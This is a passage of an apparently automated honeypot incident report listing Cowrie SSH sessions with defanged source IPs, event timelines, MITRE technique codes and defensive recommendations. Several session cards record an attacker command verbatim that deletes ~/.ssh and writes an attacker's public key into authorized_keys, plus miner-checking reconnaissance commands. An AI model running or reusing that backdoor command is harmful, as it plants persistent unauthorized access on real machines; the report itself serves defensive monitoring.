| `2026-06-30 03:00:06` | `cowrie.command.failed` |
| `2026-06-30 03:00:06` | `cowrie.log.closed` |
| `2026-06-30 03:00:07` | `cowrie.session.params` |
| `2026-06-30 03:00:07` | `cowrie.command.input` |
| `2026-06-30 03:00:07` | `cowrie.session.file_download` |
| `2026-06-30 03:00:07` | `cowrie.log.closed` |
| `2026-06-30 03:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3c7cd254f9

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-30 03:00 |
| **Last Seen** | 2026-06-30 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:00:07` | `cowrie.session.connect` |
| `2026-06-30 03:00:07` | `cowrie.client.version` |
| `2026-06-30 03:00:07` | `cowrie.client.kex` |
| `2026-06-30 03:00:08` | `cowrie.login.success` |
| `2026-06-30 03:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e93e57cafb

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-30 03:00 |
| **Last Seen** | 2026-06-30 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:00:09` | `cowrie.session.connect` |
| `2026-06-30 03:00:09` | `cowrie.client.version` |
| `2026-06-30 03:00:09` | `cowrie.client.kex` |
| `2026-06-30 03:00:10` | `cowrie.login.success` |
| `2026-06-30 03:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b94f26731b

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-06-30 03:00 |
| **Last Seen** | 2026-06-30 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:00:16` | `cowrie.session.connect` |
| `2026-06-30 03:00:16` | `cowrie.client.version` |
| `2026-06-30 03:00:17` | `cowrie.client.kex` |
| `2026-06-30 03:00:17` | `cowrie.login.success` |
| `2026-06-30 03:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-136b08c8f64c

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-06-30 03:00 |
| **Last Seen** | 2026-06-30 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:00:18` | `cowrie.session.connect` |
| `2026-06-30 03:00:18` | `cowrie.client.version` |
| `2026-06-30 03:00:18` | `cowrie.client.kex` |
| `2026-06-30 03:00:19` | `cowrie.login.success` |
| `2026-06-30 03:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7128a9b55c3e

| Field | Detail |
|---|---|
| **Source IP** | `131.241.3[.]85` |
| **First Seen** | 2026-06-30 03:01 |
| **Last Seen** | 2026-06-30 03:01 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:01:04` | `cowrie.session.connect` |
| `2026-06-30 03:01:05` | `cowrie.login.success` |
| `2026-06-30 03:01:05` | `cowrie.login.success` |
| `2026-06-30 03:01:06` | `cowrie.session.params` |
| `2026-06-30 03:01:06` | `cowrie.command.input` |
| `2026-06-30 03:01:06` | `cowrie.command.failed` |
| `2026-06-30 03:01:06` | `cowrie.command.input` |
| `2026-06-30 03:01:06` | `cowrie.command.failed` |
| `2026-06-30 03:01:06` | `cowrie.command.input` |
| `2026-06-30 03:01:06` | `cowrie.command.input` |
| `2026-06-30 03:01:06` | `cowrie.command.failed` |
| `2026-06-30 03:01:06` | `cowrie.command.failed` |
| `2026-06-30 03:01:38` | `cowrie.log.closed` |
| `2026-06-30 03:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.241.3[.]85` to AbuseIPDB if not already reported
- [ ] Block `131.241.3[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8114ee9f301

| Field | Detail |
|---|---|
| **Source IP** | `131.241.3[.]85` |
| **First Seen** | 2026-06-30 03:01 |
| **Last Seen** | 2026-06-30 03:02 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:01:38` | `cowrie.session.connect` |
| `2026-06-30 03:01:38` | `cowrie.login.success` |
| `2026-06-30 03:01:38` | `cowrie.session.params` |
| `2026-06-30 03:01:38` | `cowrie.command.input` |
| `2026-06-30 03:01:38` | `cowrie.command.failed` |
| `2026-06-30 03:01:39` | `cowrie.command.input` |
| `2026-06-30 03:01:39` | `cowrie.command.failed` |
| `2026-06-30 03:01:39` | `cowrie.command.input` |
| `2026-06-30 03:01:39` | `cowrie.command.failed` |
| `2026-06-30 03:01:39` | `cowrie.command.input` |
| `2026-06-30 03:01:39` | `cowrie.command.failed` |
| `2026-06-30 03:01:39` | `cowrie.command.input` |
| `2026-06-30 03:01:39` | `cowrie.command.input` |
| `2026-06-30 03:01:39` | `cowrie.command.failed` |
| `2026-06-30 03:01:39` | `cowrie.command.failed` |
| `2026-06-30 03:02:20` | `cowrie.log.closed` |
| `2026-06-30 03:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.241.3[.]85` to AbuseIPDB if not already reported
- [ ] Block `131.241.3[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209edea2a6af

| Field | Detail |
|---|---|
| **Source IP** | `131.241.3[.]85` |
| **First Seen** | 2026-06-30 03:02 |
| **Last Seen** | 2026-06-30 03:03 |
| **Session Duration** | 47s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:02:20` | `cowrie.session.connect` |
| `2026-06-30 03:02:33` | `cowrie.login.success` |
| `2026-06-30 03:02:34` | `cowrie.login.success` |
| `2026-06-30 03:02:34` | `cowrie.session.params` |
| `2026-06-30 03:02:35` | `cowrie.command.input` |
| `2026-06-30 03:02:35` | `cowrie.command.failed` |
| `2026-06-30 03:02:35` | `cowrie.command.input` |
| `2026-06-30 03:02:35` | `cowrie.command.failed` |
| `2026-06-30 03:02:35` | `cowrie.command.input` |
| `2026-06-30 03:02:35` | `cowrie.command.input` |
| `2026-06-30 03:02:35` | `cowrie.command.failed` |
| `2026-06-30 03:02:35` | `cowrie.command.failed` |
| `2026-06-30 03:03:07` | `cowrie.log.closed` |
| `2026-06-30 03:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.241.3[.]85` to AbuseIPDB if not already reported
- [ ] Block `131.241.3[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d958b1a3ebf1

| Field | Detail |
|---|---|
| **Source IP** | `131.241.3[.]85` |
| **First Seen** | 2026-06-30 03:03 |
| **Last Seen** | 2026-06-30 03:03 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:03:07` | `cowrie.session.connect` |
| `2026-06-30 03:03:08` | `cowrie.login.success` |
| `2026-06-30 03:03:08` | `cowrie.session.params` |
| `2026-06-30 03:03:09` | `cowrie.command.input` |
| `2026-06-30 03:03:09` | `cowrie.command.failed` |
| `2026-06-30 03:03:09` | `cowrie.command.input` |
| `2026-06-30 03:03:09` | `cowrie.command.failed` |
| `2026-06-30 03:03:09` | `cowrie.command.input` |
| `2026-06-30 03:03:09` | `cowrie.command.failed` |
| `2026-06-30 03:03:10` | `cowrie.command.input` |
| `2026-06-30 03:03:10` | `cowrie.command.failed` |
| `2026-06-30 03:03:10` | `cowrie.command.input` |
| `2026-06-30 03:03:10` | `cowrie.command.input` |
| `2026-06-30 03:03:10` | `cowrie.command.failed` |
| `2026-06-30 03:03:10` | `cowrie.command.failed` |
| `2026-06-30 03:03:41` | `cowrie.log.closed` |
| `2026-06-30 03:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.241.3[.]85` to AbuseIPDB if not already reported
- [ ] Block `131.241.3[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa8fc2073ac

| Field | Detail |
|---|---|
| **Source IP** | `115.190.255[.]67` |
| **First Seen** | 2026-06-30 03:03 |
| **Last Seen** | 2026-06-30 03:08 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:03:31` | `cowrie.session.connect` |
| `2026-06-30 03:03:32` | `cowrie.client.version` |
| `2026-06-30 03:03:32` | `cowrie.client.kex` |
| `2026-06-30 03:03:33` | `cowrie.login.success` |
| `2026-06-30 03:03:34` | `cowrie.session.params` |
| `2026-06-30 03:03:34` | `cowrie.command.input` |
| `2026-06-30 03:03:34` | `cowrie.command.failed` |
| `2026-06-30 03:03:35` | `cowrie.log.closed` |
| `2026-06-30 03:03:36` | `cowrie.session.params` |
| `2026-06-30 03:03:36` | `cowrie.command.input` |
| `2026-06-30 03:03:36` | `cowrie.session.file_download` |
| `2026-06-30 03:03:36` | `cowrie.log.closed` |
| `2026-06-30 03:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.255[.]67` to AbuseIPDB if not already reported
- [ ] Block `115.190.255[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82473f2fabba

| Field | Detail |
|---|---|
| **Source IP** | `131.241.3[.]85` |
| **First Seen** | 2026-06-30 03:03 |
| **Last Seen** | 2026-06-30 03:06 |
| **Session Duration** | 181s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:03:41` | `cowrie.session.connect` |
| `2026-06-30 03:03:42` | `cowrie.login.success` |
| `2026-06-30 03:03:42` | `cowrie.login.success` |
| `2026-06-30 03:03:43` | `cowrie.session.params` |
| `2026-06-30 03:03:43` | `cowrie.command.input` |
| `2026-06-30 03:03:43` | `cowrie.command.failed` |
| `2026-06-30 03:03:43` | `cowrie.command.input` |
| `2026-06-30 03:03:43` | `cowrie.command.failed` |
| `2026-06-30 03:03:44` | `cowrie.command.input` |
| `2026-06-30 03:03:44` | `cowrie.command.input` |
| `2026-06-30 03:03:44` | `cowrie.command.failed` |
| `2026-06-30 03:03:44` | `cowrie.command.failed` |
| `2026-06-30 03:06:43` | `cowrie.log.closed` |
| `2026-06-30 03:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.241.3[.]85` to AbuseIPDB if not already reported
- [ ] Block `131.241.3[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5e9962030d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 03:06 |
| **Last Seen** | 2026-06-30 03:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:06:42` | `cowrie.session.connect` |
| `2026-06-30 03:06:43` | `cowrie.client.version` |
| `2026-06-30 03:06:43` | `cowrie.client.kex` |
| `2026-06-30 03:06:49` | `cowrie.login.success` |
| `2026-06-30 03:06:52` | `cowrie.session.params` |
| `2026-06-30 03:06:52` | `cowrie.command.input` |
| `2026-06-30 03:06:55` | `cowrie.log.closed` |
| `2026-06-30 03:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c88bc77874c

| Field | Detail |
|---|---|
| **Source IP** | `158.101.161[.]27` |
| **First Seen** | 2026-06-30 03:08 |
| **Last Seen** | 2026-06-30 03:08 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:08:25` | `cowrie.session.connect` |
| `2026-06-30 03:08:25` | `cowrie.client.version` |
| `2026-06-30 03:08:25` | `cowrie.client.kex` |
| `2026-06-30 03:08:25` | `cowrie.login.failed` |
| `2026-06-30 03:08:26` | `cowrie.login.success` |
| `2026-06-30 03:08:27` | `cowrie.session.params` |
| `2026-06-30 03:08:27` | `cowrie.command.input` |
| `2026-06-30 03:08:27` | `cowrie.command.failed` |
| `2026-06-30 03:08:27` | `cowrie.log.closed` |
| `2026-06-30 03:08:28` | `cowrie.session.params` |
| `2026-06-30 03:08:28` | `cowrie.command.input` |
| `2026-06-30 03:08:28` | `cowrie.log.closed` |
| `2026-06-30 03:08:29` | `cowrie.session.params` |
| `2026-06-30 03:08:29` | `cowrie.command.input` |
| `2026-06-30 03:08:29` | `cowrie.log.closed` |
| `2026-06-30 03:08:30` | `cowrie.session.params` |
| `2026-06-30 03:08:30` | `cowrie.command.input` |
| `2026-06-30 03:08:30` | `cowrie.log.closed` |
| `2026-06-30 03:08:31` | `cowrie.session.params` |
| `2026-06-30 03:08:31` | `cowrie.command.input` |
| `2026-06-30 03:08:31` | `cowrie.log.closed` |
| `2026-06-30 03:08:32` | `cowrie.session.params` |
| `2026-06-30 03:08:32` | `cowrie.command.input` |
| `2026-06-30 03:08:32` | `cowrie.log.closed` |
| `2026-06-30 03:08:33` | `cowrie.session.params` |
| `2026-06-30 03:08:33` | `cowrie.command.input` |
| `2026-06-30 03:08:33` | `cowrie.log.closed` |
| `2026-06-30 03:08:34` | `cowrie.session.params` |
| `2026-06-30 03:08:34` | `cowrie.command.input` |
| `2026-06-30 03:08:34` | `cowrie.log.closed` |
| `2026-06-30 03:08:35` | `cowrie.session.params` |
| `2026-06-30 03:08:35` | `cowrie.command.input` |
| `2026-06-30 03:08:35` | `cowrie.log.closed` |
| `2026-06-30 03:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.101.161[.]27` to AbuseIPDB if not already reported
- [ ] Block `158.101.161[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c0d6c65acf

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 03:10 |
| **Last Seen** | 2026-06-30 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:10:33` | `cowrie.session.connect` |
| `2026-06-30 03:10:33` | `cowrie.client.version` |
| `2026-06-30 03:10:33` | `cowrie.client.kex` |
| `2026-06-30 03:10:35` | `cowrie.login.success` |
| `2026-06-30 03:10:37` | `cowrie.session.params` |
| `2026-06-30 03:10:37` | `cowrie.command.input` |
| `2026-06-30 03:10:38` | `cowrie.log.closed` |
| `2026-06-30 03:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cae21bc773

| Field | Detail |
|---|---|
| **Source IP** | `177.11.196[.]79` |
| **First Seen** | 2026-06-30 03:11 |
| **Last Seen** | 2026-06-30 03:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:11:18` | `cowrie.session.connect` |
| `2026-06-30 03:11:18` | `cowrie.client.version` |
| `2026-06-30 03:11:18` | `cowrie.client.kex` |
| `2026-06-30 03:11:19` | `cowrie.login.success` |
| `2026-06-30 03:11:20` | `cowrie.session.params` |
| `2026-06-30 03:11:20` | `cowrie.command.input` |
| `2026-06-30 03:11:20` | `cowrie.command.failed` |
| `2026-06-30 03:11:20` | `cowrie.log.closed` |
| `2026-06-30 03:11:21` | `cowrie.session.params` |
| `2026-06-30 03:11:21` | `cowrie.command.input` |
| `2026-06-30 03:11:21` | `cowrie.session.file_download` |
| `2026-06-30 03:11:21` | `cowrie.log.closed` |
| `2026-06-30 03:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.11.196[.]79` to AbuseIPDB if not already reported
- [ ] Block `177.11.196[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6dd0832de93

| Field | Detail |
|---|---|
| **Source IP** | `177.11.196[.]79` |
| **First Seen** | 2026-06-30 03:11 |
| **Last Seen** | 2026-06-30 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:11:21` | `cowrie.session.connect` |
| `2026-06-30 03:11:21` | `cowrie.client.version` |
| `2026-06-30 03:11:21` | `cowrie.client.kex` |
| `2026-06-30 03:11:22` | `cowrie.login.success` |
| `2026-06-30 03:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.11.196[.]79` to AbuseIPDB if not already reported
- [ ] Block `177.11.196[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2094271db27b

| Field | Detail |
|---|---|
| **Source IP** | `177.11.196[.]79` |
| **First Seen** | 2026-06-30 03:11 |
| **Last Seen** | 2026-06-30 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:11:22` | `cowrie.session.connect` |
| `2026-06-30 03:11:22` | `cowrie.client.version` |
| `2026-06-30 03:11:22` | `cowrie.client.kex` |
| `2026-06-30 03:11:23` | `cowrie.login.success` |
| `2026-06-30 03:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.11.196[.]79` to AbuseIPDB if not already reported
- [ ] Block `177.11.196[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1f55142204

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 03:19 |
| **Last Seen** | 2026-06-30 03:19 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:19:14` | `cowrie.session.connect` |
| `2026-06-30 03:19:15` | `cowrie.client.version` |
| `2026-06-30 03:19:15` | `cowrie.client.kex` |
| `2026-06-30 03:19:22` | `cowrie.login.success` |
| `2026-06-30 03:19:27` | `cowrie.session.params` |
| `2026-06-30 03:19:27` | `cowrie.command.input` |
| `2026-06-30 03:19:28` | `cowrie.log.closed` |
| `2026-06-30 03:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b3c235bb41

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 03:25 |
| **Last Seen** | 2026-06-30 03:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:25:22` | `cowrie.session.connect` |
| `2026-06-30 03:25:22` | `cowrie.client.version` |
| `2026-06-30 03:25:22` | `cowrie.client.kex` |
| `2026-06-30 03:25:24` | `cowrie.login.success` |
| `2026-06-30 03:25:25` | `cowrie.session.params` |
| `2026-06-30 03:25:25` | `cowrie.command.input` |
| `2026-06-30 03:25:26` | `cowrie.log.closed` |
| `2026-06-30 03:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366a783f0390

| Field | Detail |
|---|---|
| **Source IP** | `69.164.192[.]53` |
| **First Seen** | 2026-06-30 03:26 |
| **Last Seen** | 2026-06-30 03:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:26:25` | `cowrie.session.connect` |
| `2026-06-30 03:26:25` | `cowrie.client.version` |
| `2026-06-30 03:26:25` | `cowrie.client.kex` |
| `2026-06-30 03:26:25` | `cowrie.login.success` |
| `2026-06-30 03:26:26` | `cowrie.session.params` |
| `2026-06-30 03:26:26` | `cowrie.command.input` |
| `2026-06-30 03:26:26` | `cowrie.command.failed` |
| `2026-06-30 03:26:26` | `cowrie.log.closed` |
| `2026-06-30 03:26:27` | `cowrie.session.params` |
| `2026-06-30 03:26:27` | `cowrie.command.input` |
| `2026-06-30 03:26:27` | `cowrie.session.file_download` |
| `2026-06-30 03:26:27` | `cowrie.log.closed` |
| `2026-06-30 03:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.192[.]53` to AbuseIPDB if not already reported
- [ ] Block `69.164.192[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1255e456d43

| Field | Detail |
|---|---|
| **Source IP** | `69.164.192[.]53` |
| **First Seen** | 2026-06-30 03:26 |
| **Last Seen** | 2026-06-30 03:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:26:27` | `cowrie.session.connect` |
| `2026-06-30 03:26:27` | `cowrie.client.version` |
